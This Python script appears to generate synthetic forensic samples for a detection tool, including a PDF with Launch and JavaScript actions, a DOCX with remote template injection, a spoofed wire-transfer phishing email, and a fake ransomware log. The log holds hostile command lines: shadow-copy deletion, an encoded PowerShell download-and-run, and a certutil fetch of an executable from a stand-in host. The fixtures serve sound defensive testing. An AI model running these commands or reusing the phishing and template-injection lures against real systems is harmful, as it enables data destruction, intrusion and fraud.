"""
Safe Synthetic Forensic Evidence Generator for ForenSight.

Generates completely benign, safe demonstration samples for portfolio evaluations,
automated testing, and cross-platform verification on Kali Linux.
Never contains live malware, exploit payloads, or malicious shellcode.
"""

import email.message
import email.policy
from pathlib import Path
import struct
import zipfile


def create_minimal_pe() -> bytes:
    """Construct a deterministic, synthetic 32-bit PE binary in memory."""
    dos_header = bytearray(64)
    dos_header[0:2] = b"MZ"
    struct.pack_into("<I", dos_header, 0x3C, 0x80)

    pe_data = bytearray(dos_header)
    pe_data.extend(b"\x00" * (0x80 - len(pe_data)))
    pe_data.extend(b"PE\x00\x00")

    # IMAGE_FILE_HEADER (20 bytes)
    file_header = struct.pack("<HHIIIHH", 0x014C, 1, 0, 0, 0, 224, 0x0102)
    pe_data.extend(file_header)

    # IMAGE_OPTIONAL_HEADER32 (224 bytes)
    opt_header = bytearray(224)
    struct.pack_into("<H", opt_header, 0, 0x010B)
    struct.pack_into("<I", opt_header, 16, 0x1000)
    struct.pack_into("<I", opt_header, 28, 0x00400000)
    struct.pack_into("<I", opt_header, 32, 0x1000)
    struct.pack_into("<I", opt_header, 36, 0x200)
    struct.pack_into("<I", opt_header, 56, 0x2000)
    struct.pack_into("<I", opt_header, 60, 0x400)
    struct.pack_into("<H", opt_header, 68, 2)
    struct.pack_into("<I", opt_header, 92, 16)
    pe_data.extend(opt_header)

    # IMAGE_SECTION_HEADER (.text)
    sec_name = b".text\x00\x00\x00"
    sec_header = struct.pack(
        "<8sIIIIIIHHI",
        sec_name,
        0x500,
        0x1000,
        0x200,
        0x400,
        0,
        0,
        0,
        0,
        0x60000020,
    )
    pe_data.extend(sec_header)
    pe_data.extend(b"\x00" * (0x400 - len(pe_data)))
    pe_data.extend(b"\x90" * 0x200)  # Benign NOPs
    return bytes(pe_data)


def generate_samples(target_dir: Path) -> None:
    """Generate all synthetic forensic test artifacts."""
    target_dir.mkdir(parents=True, exist_ok=True)
    pe_bytes = create_minimal_pe()

    # 1. Clean PE Binary
    pe_file = target_dir / "sample_clean.exe"
    pe_file.write_bytes(pe_bytes)
    print(f"[+] Created {pe_file.name} ({len(pe_bytes)} bytes)")

    # 2. Deceptive PE Masquerading as PDF
    masquerade_file = target_dir / "sample_masquerade.pdf"
    masquerade_file.write_bytes(pe_bytes)
    print(f"[+] Created {masquerade_file.name} (PE binary with .pdf extension)")

    # 3. PDF with Suspicious /JavaScript, /Launch, and /URI Actions
    pdf_file = target_dir / "sample_actions.pdf"
    pdf_content = (
        b"%PDF-1.7\n"
        b"1 0 obj\n<< /Type /Catalog /OpenAction 2 0 R /Pages 4 0 R >>\nendobj\n"
        b"2 0 obj\n<< /S /JavaScript /JS (app.alert('Benign demonstration notification');) >>\nendobj\n"
        b"3 0 obj\n<< /S /Launch /F (calc.exe) >>\nendobj\n"
        b"4 0 obj\n<< /Type /Pages /Kids [5 0 R] /Count 1 >>\nendobj\n"
        b"5 0 obj\n<< /Type /Page /Parent 4 0 R /Annots [6 0 R] >>\nendobj\n"
        b"6 0 obj\n<< /Type /Annot /Subtype /Link /A << /S /URI /URI (http://suspicious-telemetry.example.org/beacon) >> >>\nendobj\n"
        b"trailer\n<< /Root 1 0 R >>\n%%EOF\n"
    )
    pdf_file.write_bytes(pdf_content)
    print(f"[+] Created {pdf_file.name} (PDF with /JavaScript and /Launch actions)")

    # 4. DOCX with Remote Template Injection (MITRE ATT&CK T1221)
    docx_file = target_dir / "sample_template_injection.docx"
    with zipfile.ZipFile(docx_file, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types/>")
        zf.writestr("word/document.xml", "<w:document><w:body><w:p/></w:body></w:document>")
        zf.writestr(
            "docProps/core.xml",
            '<?xml version="1.0" encoding="UTF-8"?><cp:coreProperties xmlns:cp="http://schemas.openxmlformats.org/package/2006/metadata/core-properties" xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:creator>APT Simulation Actor</dc:creator></cp:coreProperties>',
        )
        zf.writestr(
            "word/_rels/settings.xml.rels",
            '<?xml version="1.0" encoding="UTF-8"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="http://malicious-templates.example.org/themes/style.dotm" TargetMode="External"/></Relationships>',
        )
    print(f"[+] Created {docx_file.name} (DOCX with external template injection)")

    # 5. Phishing Email with From/Reply-To Spoof and Dangerous Attachment
    eml_file = target_dir / "sample_phishing.eml"
    msg = email.message.EmailMessage(policy=email.policy.default)
    msg["From"] = "Executive Office <ceo@corporate-hq.com>"
    msg["To"] = "employee@corporate-hq.com"
    msg["Reply-To"] = "urgent-response@external-attacker-domain.xyz"
    msg["Subject"] = "URGENT: Review Wire Transfer Documentation"
    msg["Date"] = "Tue, 10 Nov 2026 14:00:00 +0000"
    msg["Received-SPF"] = "Fail (corporate-hq.com: domain does not designate 198.51.100.24 as permitted sender)"
    msg.set_content(
        "Please review the attached invoice immediately.\n"
        "Further instructions: http://c2-finance-update.example.net/confirm\n"
    )
    msg.add_attachment(
        b"MZ\x90\x00synthetic_payload",
        maintype="application",
        subtype="octet-stream",
        filename="wire_transfer_receipt.pdf.exe",
    )
    eml_file.write_bytes(msg.as_bytes())
    print(f"[+] Created {eml_file.name} (Phishing EML with spoof and dangerous attachment)")

    # 6. Archive with Double-Extension Executable
    zip_file = target_dir / "sample_double_extension.zip"
    with zipfile.ZipFile(zip_file, "w") as zf:
        zf.writestr("readme.txt", "Please find invoice attached.\n")
        zf.writestr("statement.pdf.exe", b"MZ\x90\x00synthetic_deceptive_binary")
    print(f"[+] Created {zip_file.name} (ZIP with double-extension executable)")

    # 7. Forensic Ransomware / Attack Command Log
    log_file = target_dir / "sample_ransomware_log.txt"
    log_content = (
        "2026-11-10 12:00:01 [PROC_SPAWN] PID=4102 parent=cmd.exe command=\"vssadmin delete shadows /all /quiet\"\n"
        "2026-11-10 12:00:05 [PROC_SPAWN] PID=4108 image=powershell.exe args=\"powershell -enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTk4LjUxLjEwMC45OTo4MDgwL2lucHV0LnBzMScp\"\n"
        "2026-11-10 12:00:10 [NET_CONN] PID=4108 dest_ip=198.51.100.99 dest_port=8080 url=\"http://198.51.100.99:8080/beacon\"\n"
        "2026-11-10 12:00:15 [PROC_SPAWN] PID=4112 image=certutil.exe args=\"certutil -urlcache -f http://staging-host.example.org/agent.bin agent.exe\"\n"
    )
    log_file.write_text(log_content, encoding="utf-8")
    print(f"[+] Created {log_file.name} (Log with ransomware shadow deletion and LOLBin commands)")


if __name__ == "__main__":
    samples_dir = Path(__file__).resolve().parent.parent / "data" / "samples"
    generate_samples(samples_dir)
    print(f"\n[✓] Synthetic sample evidence suite successfully generated in: {samples_dir}")
